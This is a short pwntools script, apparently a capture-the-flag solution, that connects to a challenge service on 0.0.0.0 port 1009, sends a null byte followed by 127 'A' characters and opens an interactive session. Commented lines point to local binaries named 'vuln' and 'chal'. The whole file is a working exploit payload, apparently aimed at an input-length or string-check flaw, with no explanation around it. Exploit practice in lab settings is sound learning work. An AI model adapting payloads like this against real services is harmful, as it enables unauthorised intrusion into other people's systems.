from pwn import * 

# io = process("./vuln")
# io = process("./chal")
io = remote("0.0.0.0",1009)

io.sendline(b"\0"+b"A"*127)


io.interactive()      